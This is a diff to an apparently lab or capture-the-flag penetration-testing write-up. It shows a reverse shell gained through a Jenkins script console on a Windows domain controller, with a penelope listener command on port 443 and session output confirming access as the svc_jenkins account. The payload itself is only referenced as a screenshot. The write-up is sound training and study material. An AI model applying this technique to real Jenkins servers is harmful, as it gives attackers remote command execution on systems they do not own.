@@ -527,4 +527,31 @@ I can use the script console in jenkins to get a reverse shell
 
 ![](Pasted%20image%2020260501202029.png)
 
-Ill change the IP and the port, and ive also made it run powershell instead of cmd
+Ill change the IP and the port
+
+```python
+penelope -p 443                  
+[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 192.168.1.157 • 10.200.52.144
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+```
+Ill set a listener
+
+Then ill run the code
+
+```python
+penelope -p 443                  
+[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 192.168.1.157 • 10.200.52.144
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => DC 10.0.18.23 Microsoft_Windows_Server_2019_Standard_Evaluation-x64-based_PC 👤 novacart\svc_jenkins 😍️ Session ID <1>
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC~10.0.18.23-Microsoft_Windows_Server_2019_Standard_Evaluation-x64-based_PC/2026_05_01-20_22_25-175.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+C:\Program Files\Jenkins>whoami
+whoami
+novacart\svc_jenkins
+
+C:\Program Files\Jenkins>
+```
+i now have a reverse shell as the svc_jenkins user
+
